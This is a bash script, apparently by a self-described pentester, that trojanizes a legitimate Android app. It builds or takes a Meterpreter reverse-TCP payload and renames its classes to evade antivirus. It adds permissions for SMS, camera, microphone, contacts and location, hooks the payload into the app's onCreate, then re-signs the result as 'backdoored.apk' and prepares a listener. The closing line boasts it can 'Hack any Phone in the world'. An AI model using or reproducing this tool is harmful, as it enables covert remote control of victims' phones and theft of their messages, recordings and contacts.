#!/bin/bash
abort()
{
    echo "An error occurred. Exiting..." >&2
    exit 1
}

trap 'abort' 0
set -e
echo -e "\033[32m"
pe='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
apktool="./apktool.jar "
vok='    invoke-static {p0}, Lcom/appandroid/stage/Payload;->start(Landroid/content/Context;)V'
prompt="Please choose one to hook it : "
PS3="$prompt"
path=`pwd`
myip=''
red=`tput setaf 1`
green=`tput setaf 2`
echo  "##############################################################"
echo  "## Please subscribe To my youtube channel ##                ##"
echo  "## https://www.youtube.com/channel/UCd9ZDgfoabrObsNGqz4gQvw ##"
echo  "## By Chihab Os :) PentestersLab                            ##"
echo  "##############################################################"
echo '''
              `                                                  `
           `.-:::-.`                                         .-::::-`
              `.::::.                                      `::::.`
               .:::::`         `.              ``         `:::::.
        `     .:::::::-.`       `.  ``....``` `.        `.:::::::.     `
        -:-.`.:::::::::::-.`    `-::::::::::::-.`   `.-:::::::::::.``.-:
         -::::::::::::::::::.`.::::::::::::::::::-`.::::::::::::::::::-`
          `.-----..-:::::::``::::++/::::::::/+o::::.`:::::::-..-----.`
                     `.-::``:::::syys+::::+syyy/::::.`::-.`
                         ` ::::::/+o+/::::/+o+/::::::```
                           ------::::::::::::::------`
             ```           -----`.-::::::::::-``-----`
          .--:::--.``.---.`::::::. :::::::::- .::::::.`--..```.--:---.
        `-:---:::::::::::.`:::::::``..`..`..``:::::::.`:::::::::::---:-.
        ``    -::::::::::.`::::::::--::--::--::::::::.`:::::::::::   ```
              `:::::::::-``::::::::::::::::::::::::::.`-:::::::::.
               -:::::``   `::::::::::::::::::::::::::.  ```-:::::
           ``.--:::-`     `::::::::::::::::::::::::::.     `-::::..``
          `.-----.`       `::::::::::::::::::::::::::.       `.-:::-.`
                          `::::::::::::::::::::::::::.
                          `::::::::::::::::::::::::::.
                           -:::::::::::::::::::::::::`
                            `...::::::....::::::....`
                                -:::::    -:::::
                                -:::::    -:::::
                                -:::::    -:::::
                                `.....    ......      '''
echo "$red warning please don't try to change the folder name "
sleep 3
clear
echo '''``            ``          ``
                       -`  ``````` `-
                      `.::::::::::::.`
                    `-::::::::::::::::-`
                   .:::- .::::::::. -:::.
                  `::::::::::::::::::::::`
                  -::::::::::::::::::::::-
            `.--` ........................ `--.`
            -::::`-::::::::::::::::::::::-`::::-
            -::::`-::::::::::::::::::::::-`:::::
            -::::`-::::::::::::::::::::::-`:::::
            -::::`-::::::::::::::::::::::-`:::::
            -::::`-::::::::::::::::::::::-`:::::
            -::::`-::::::::::::::::::::::-`:::::
            .::::`-::::::::::::::::::::::- ::::-
             ```  -::::::::::::::::::::::-  ```
                  .::::::::::::::::::::::.
                   ````:::::.``.:::::````
                       :::::`  `:::::
                       :::::`  `:::::
                       -::::`  `:::::
                        .-.`    `.-. '''
echo "$red please don't try to change the script name "
echo ""
echo -n "Please enter the original (apk) path >>> : "
read apk_clean
echo  "###############################################"
echo -e "$red Please Do you want  to use Your own Payload.apk or let the script build new one for You Y or N \n Y = choose your own Payload\n N = let the script build new one for You "
echo -n ' Y / N ? : '
read apk_payload
if [[ $apk_payload = Y ]]; then
echo -n "Please enter Your  payload (apk)  path >>> :"
read payload_user
java -jar $apktool d -f $payload_user -o payloadapk
elif [[ $apk_payload = N ]]; then
echo "$green Your Ip Address is"
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
echo    'Your External IP address is '
$myip ; echo
echo -n "Please enter Your Ip Address >>> :  "
read Ip
echo -n "Pleas enter the port you want to use >>> : "
read port
echo " $green wait until the script  build a {payload} for you ....."
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$Ip LPORT=${port} R > ${path}/androvenom.apk
echo "You will finde it here $path "
sudo mkdir ${path}/revtcp.rc | printf "use exploit/multi/handler \nset lport $port \nset lhost $Ip \nset ExitOnSession false \nset payload android/meterpreter/reverse_tcp \nexploit -j " > revtcp.rc
echo "decompiling the Payload  apk....../"
java -jar $apktool d -f androvenom.apk -o payloadapk
rm androvenom.apk
fi
echo  "###############################################"
echo       "[*] waite ....../"
echo       "decompiling the original apk....../"
java -jar $apktool d -f $apk_clean -o originalapk
echo "$red [*] Modifying the payload files from metasploit to appandroid this will make tha payload (Almost) Fully Undetectable "
cd payloadapk/smali/com/metasploit/stage
sed -i 's/metasploit/appandroid/g' *
sleep 3
cd ../../../../../
echo '[*]  moving Payload files to the original apk folder '
mv $path/payloadapk/smali/com/* $path/payloadapk/smali/com/appandroid
mv $path/payloadapk/smali/com/appandroid $path/originalapk/smali/com
sleep 2
echo  "[*] wait while injecting necessary permission..."
sed  -i "5i\ ${pe}" originalapk/AndroidManifest.xml
echo 'injecting..../'
grep -r ";->onCreate(Landroid/os/Bundle;)V" 'originalapk/smali/com/' | cut -d ":" -f 1 > hook1.txt
sleep 3
echo " $red ##################################################################"
echo "$green"
options=( $(cat hook1.txt | xargs -0) )
select opt in "${options[@]}" "Quit" ; do
    if (( REPLY == 1 + ${#options[@]} )) ; then
        exit

    elif (( REPLY > 0 && REPLY <= ${#options[@]} )) ; then
        echo  "You picked $opt which is file $REPLY"
        break

    else
        echo "Invalid option. Try another one."
    fi
done

echo "########################################################"
grep -n ";->onCreate(Landroid/os/Bundle;)V" $opt | cut -d ";" -f 1
echo "########################################################"
echo -n " $green Please choose a number to complete the injection process >>> :"
read num_h
sed -i "${num_h}i\ ${vok}" ${opt}
echo "$red hooked"
rm hook1.txt
echo 'cleaning'
rm -r payloadapk
echo 'done'
sleep 3
echo 'Rebuilding ..../'
java -jar $apktool b originalapk -o embedded.apk
echo " $green [*]  waite while Signing the apk ....../ "
sleep 3
rm -r originalapk
mv embedded.apk signapk
cd signapk
java -jar signapk.jar certificate.pem key.pk8 embedded.apk backdoored.apk
echo ' You will find it here '
echo "$path/backdoored.apk"
rm embedded.apk
echo "**********************************************************************"
echo " LHOST : $Ip                                                                                                                      "
echo " lport : ${port}                                                                                                                  "
echo " hook : $opt                                                                                                                      "
echo " $vok                                                                                                                             "
echo " ********************************************************************* "
echo "You can start a handler with Metasploit at any time by runing this commend msfconsole -r $path/revtcp.rc"
trap : 0

echo >&2 'Done You can now Hack any Phone in the world Now .....'
